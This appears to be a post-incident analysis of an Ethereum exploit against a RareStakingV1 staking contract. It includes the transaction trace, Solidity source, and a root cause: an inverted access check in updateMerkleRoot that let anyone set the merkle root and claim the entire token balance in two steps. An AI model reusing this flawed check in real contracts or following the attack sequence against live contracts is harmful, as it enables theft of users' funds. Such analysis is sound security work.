### Tx Hash
0xd813751bfb98a51912b8394b5856ae4515be6a9c6e5583e06b41d9255ba6e3c1
### Chain
Ethereum
### Tx Trace
```
Executing previous transactions from the block.
Traces:
  [936556] 0x2073111E6Ebb6826F7e9c6192C6304Aa5aF5E340::ad24067c()
    ├─ [790933] → new <unknown>@0x08947cedf35f9669012bDA6FdA9d03c399B017Ab
    │   ├─ [7596] 0x3f4D749675B3e48bCCd932033808a7079328Eb48::token() [staticcall]
    │   │   ├─ [2625] RareStakingV1::token() [delegatecall]
    │   │   │   └─ ← [Return] TransparentUpgradeableProxy: [0xba5BDe662c17e2aDFF1075610382B9B691296350]
    │   │   └─ ← [Return] TransparentUpgradeableProxy: [0xba5BDe662c17e2aDFF1075610382B9B691296350]
    │   └─ ← [Return] 3894 bytes of code
    ├─ [13414] 0x08947cedf35f9669012bDA6FdA9d03c399B017Ab::getStakingContractBalance()
    │   ├─ [9873] TransparentUpgradeableProxy::fallback(0x3f4D749675B3e48bCCd932033808a7079328Eb48) [staticcall]
    │   │   ├─ [2542] SuperRareToken::balanceOf(0x3f4D749675B3e48bCCd932033808a7079328Eb48) [delegatecall]
    │   │   │   └─ ← [Return] 11907874713019104529057960 [1.19e25]
    │   │   └─ ← [Return] 11907874713019104529057960 [1.19e25]
    │   └─ ← [Return] 0x00000000000000000000000000000000000000000009d9972e8262b432cd88a8
    ├─ [4414] 0x08947cedf35f9669012bDA6FdA9d03c399B017Ab::getTokenBalance()
    │   ├─ [3373] TransparentUpgradeableProxy::fallback(0x08947cedf35f9669012bDA6FdA9d03c399B017Ab) [staticcall]
    │   │   ├─ [2542] SuperRareToken::balanceOf(0x08947cedf35f9669012bDA6FdA9d03c399B017Ab) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [83889] 0x08947cedf35f9669012bDA6FdA9d03c399B017Ab::643a0e92()
    │   ├─ [1373] TransparentUpgradeableProxy::fallback(0x3f4D749675B3e48bCCd932033808a7079328Eb48) [staticcall]
    │   │   ├─ [542] SuperRareToken::balanceOf(0x3f4D749675B3e48bCCd932033808a7079328Eb48) [delegatecall]
    │   │   │   └─ ← [Return] 11907874713019104529057960 [1.19e25]
    │   │   └─ ← [Return] 11907874713019104529057960 [1.19e25]
    │   ├─ [15406] 0x3f4D749675B3e48bCCd932033808a7079328Eb48::updateMerkleRoot(0x93f3c0d0d71a7c606fe87524887594a106b44c65d46fa72a42d80bd6259ade7e)
    │   │   ├─ [14935] RareStakingV1::updateMerkleRoot(0x93f3c0d0d71a7c606fe87524887594a106b44c65d46fa72a42d80bd6259ade7e) [delegatecall]
    │   │   │   ├─ emit NewClaimRootAdded(root: 0x93f3c0d0d71a7c606fe87524887594a106b44c65d46fa72a42d80bd6259ade7e, round: 3, timestamp: 1753690919 [1.753e9])
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [63044] 0x3f4D749675B3e48bCCd932033808a7079328Eb48::claim(11907874713019104529057960 [1.19e25], [])
    │   │   ├─ [62564] RareStakingV1::claim(11907874713019104529057960 [1.19e25], []) [delegatecall]
    │   │   │   ├─ [29320] TransparentUpgradeableProxy::fallback(0x08947cedf35f9669012bDA6FdA9d03c399B017Ab, 11907874713019104529057960 [1.19e25])
    │   │   │   │   ├─ [28486] SuperRareToken::transfer(0x08947cedf35f9669012bDA6FdA9d03c399B017Ab, 11907874713019104529057960 [1.19e25]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0x3f4D749675B3e48bCCd932033808a7079328Eb48, to: 0x08947cedf35f9669012bDA6FdA9d03c399B017Ab, value: 11907874713019104529057960 [1.19e25])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit TokensClaimed(root: 0x93f3c0d0d71a7c606fe87524887594a106b44c65d46fa72a42d80bd6259ade7e, addr: 0x08947cedf35f9669012bDA6FdA9d03c399B017Ab, amount: 11907874713019104529057960 [1.19e25], round: 3)
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─  emit topic 0: 0x3c92b007d4471ad421225950d1da74d65f1a432fb12bfc964eb21095a41c3b5a
    │   │           data: 0x00000000000000000000000000000000000000000009d9972e8262b432cd88a8
    │   └─ ← [Stop]
    └─ ← [Stop]


Transaction successfully executed.
Gas used: 1015588
```
### Source Code
```solidity
function claim(
        uint256 amount,
        bytes32[] calldata proof
    ) public override nonReentrant {
        if (!verifyEntitled(_msgSender(), amount, proof))
            revert InvalidMerkleProof();
        if (lastClaimedRound[_msgSender()] >= currentRound)
            revert AlreadyClaimed();

        lastClaimedRound[_msgSender()] = currentRound;
        _token.safeTransfer(_msgSender(), amount);

        emit TokensClaimed(
            currentClaimRoot,
            _msgSender(),
            amount,
            currentRound
        );
    }
function token() external view override returns (address) {
        return address(_token);
    }
function updateMerkleRoot(bytes32 newRoot) external override {
        require((msg.sender != owner() || msg.sender != address(0xc2F394a45e994bc81EfF678bDE9172e10f7c8ddc)), "Not authorized to update merkle root");
        if (newRoot == bytes32(0)) revert EmptyMerkleRoot();
        currentClaimRoot = newRoot;
        currentRound++;
        emit NewClaimRootAdded(newRoot, currentRound, block.timestamp);
    }
```
### Vulnerability Type
Access Control
### Vulnerable Source Code
```solidity
function updateMerkleRoot(bytes32 newRoot) external override {
    require((msg.sender != owner() || msg.sender != address(0xc2F394a45e994bc81EfF678bDE9172e10f7c8ddc)), "Not authorized to update merkle root");
    if (newRoot == bytes32(0)) revert EmptyMerkleRoot();
    currentClaimRoot = newRoot;
    currentRound++;
    emit NewClaimRootAdded(newRoot, currentRound, block.timestamp);
}
```
### Root Cause
The `require` statement in the `updateMerkleRoot` function had an incorrect expression that would resolve to `true` if the `msg.sender` was not the owner of the contract. This is an inverted expression and allowed anyone to call `updateMerkleRoot` instead of only allowing the owner or the specified hardcoded address. This allowed the attacker to update the merkle root for the contract to one where they own all the value in the contract which allowed them to extract value from the contract.
### Attack Sequence
1. Attacker calls `updateMerkleRoot` with a new merkle root that indicates they can claim all the value from the contract.
2. Attacker calls `claim` to extract all the value from the contract.
